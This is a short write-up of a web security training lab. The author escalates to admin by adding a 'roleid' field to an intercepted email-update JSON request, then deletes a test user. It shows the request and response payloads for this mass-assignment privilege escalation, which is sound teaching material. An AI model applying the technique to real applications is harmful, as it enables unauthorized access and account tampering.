# Description
This lab has an admin panel at `/admin`. It's only accessible to logged-in users with a `roleid` of 2. Solve the lab by accessing the admin panel and using it to delete the user `carlos`. You can log in to your own account using the following credentials: `wiener:peter`

# Process
To begin, I logged into my account with the provided credentials. On the account page, it listed my username and my email, which had the extension `@normal-user.net`. It also included an option to update my email.

I entered the same email that I already had into the update email box, and pressed the submit button. I intercepted the request with Burp Suite, but there was nothing notable that could be updated:
```
{
  "email":"wiener@normal-user.net"
}
```

Next, I went to the `/admin` control panel page. This didn't contain any interesting requests either, so I moved on.

I opened Burp Target and reviewed the requests that I had already intercepted while browsing the website. I noticed that, after changing my email. I received a response that included my username, email, API key, and the role ID:
```
{
  "username": "wiener",
  "email": "wiener@normal-user.net",
  "apikey": "IgeIGxKGusufZtJOP3ycOEKESCkxmY8d",
  "roleid": 1
}
```

My first thought was to modify the request that changed my email:
```
{
  "email": "wiener@normal-user.net",
  "roleid": 2
}
```

The response back:
```
{
  "username": "wiener",
  "email": "wiener@normal-user.net",
  "apikey": "IgeIGxKGusufZtJOP3ycOEKESCkxmY8d",
  "roleid": 2
}
```

It had succeeded! I navigated to the admin console and deleted `carlos` to complete the lab.